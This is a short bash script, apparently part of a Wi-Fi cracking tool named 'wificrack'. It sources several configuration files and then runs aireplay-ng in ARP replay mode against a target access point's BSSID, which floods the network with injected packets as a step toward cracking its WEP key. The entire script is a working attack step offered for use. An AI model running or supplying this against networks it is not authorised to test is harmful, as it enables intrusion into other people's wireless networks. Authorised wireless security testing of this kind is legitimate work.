#!/bin/bash

PWD="$(pwd)"
CONFIG_DIR="$HOME/.wificrack"
CONFIG_FILE="$CONFIG_DIR/config.conf"
source "$CONFIG_FILE"

source "$CONFIG_INTERFACE"

source "$CURRENT_ATTACK_FILE"
source "$CONFIG_ATTACK"

aireplay-ng --arpreplay -b "$BSSID" -h "$INTERFACE_MAC" "$INTERFACE"
